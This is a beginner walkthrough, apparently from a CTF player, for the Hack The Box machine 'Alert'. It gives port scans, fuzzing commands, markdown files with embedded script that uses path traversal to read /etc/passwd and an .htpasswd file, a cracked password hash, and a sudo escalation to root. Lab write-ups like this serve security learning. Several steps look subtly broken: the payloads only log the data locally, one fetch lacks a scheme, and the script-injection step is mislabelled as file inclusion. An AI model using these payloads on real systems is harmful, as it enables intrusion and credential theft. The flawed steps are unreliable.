# Alert

`Alert` is a Linux machine that is rated as easy. It is a great box for beginners and is a good way to get introduced to the platform. 

[Alert](https://app.hackthebox.com/machines/Alert)

## `nmap`

We will begin by enumerating open services using `nmap`. 
We will find that there is a web server running on port 80. 

```bash
Nmap scan report for 10.129.128.62
Host is up (0.095s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
12227/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> The web server can be accessed by visiting `http://alert.htb/` after adding the IP and Hostname to the `/etc/hosts` file.

This web server is a Markdown Viewer where you can upload and view markdown files.
This server also allow to contact the admin by sending a message.
There is also a About page and a Donate page.

## `ffuf`

Let's now, fuzz the web server using `ffuf` to find any hidden directories or virtual hosts.

1. Directories fuzzing

```bash
ffuf -u http://alert.htb/FUZZ -w /usr/share/wordlists/*
```

> We will find that there is a file named `messages.php` in the root directory.

2. Virtual Host fuzzing

```bash
ffuf -u http://FUZZ.alert.htb -w /usr/share/wordlists/* -H "Host: FUZZ.alert.htb"
```

> There is also a Virtual Host named `statistics.alert.htb` !

3. Virtual Host Directories fuzzing

```bash
ffuf -u http://statistics.alert.htb/FUZZ -w /usr/share/wordlists/*
```

> Many `.ht*` files are found in the root directory of the Virtual Host.
> This means it uses Apache !

## `Burp Suite`

Let's now intercept requests when uploading Markdown files and while sending a message to the admin.

1. Uploading Markdown file

- The file is uploaded to the `/uploads` directory.
- The file is processed with `.php` to view the content.
- The site proposed a link to share the file.

2. Sending a message to the admin

- The message is sent to the admin.
- The message is processed with a `GET` to it !?

## `LFI`

We can exploit a Local File Inclusion vulnerability to read the `/etc/passwd` file.
Let's write a Markdown file with a `JavaScript` payload to read the `/etc/passwd` file within `HTML` tags !

```markdown
<script>
    fetch('/messages.php?file=../../../etc/passwd')
    .then(response => response.text())
    .then(data => {
        console.log(data);
    });
</script>
```

Let's upload the file with the Markdown Viewer then copy the link to share it.
We will now send the link to the admin and intercept the request for getting his administrator rights !

> We will find that two users are present on the machine: `albert' and 'david'.

Let's try an other to read `statistic.alert.htb/.htpasswd` file !

```markdown
<script>
    fetch('statistics.alert.htb/.htpasswd')
    .then(response => response.text())
    .then(data => {
        console.log(data);
    });
</script>
```

> We will find that the `.htpasswd` file contains the credentials for the `albert` user !

```plaintext
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

## `hashcat`

We can crack the password hash using `hashcat` with the following command.

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

> The password is `manchesterunited`.

## User Flag

Let's now connect to the machine using the `albert` user.

```bash
ssh albert@alert.htb
```

> We can now read the `user.txt` file in the home directory of the `albert` user.

## Root Flag

Let's see what Albert can do.

```bash
sudo -l
```

> Albert can run everything !

Let's now get the root flag !

```bash
sudo su
cd
cat root.txt
```

DONE !
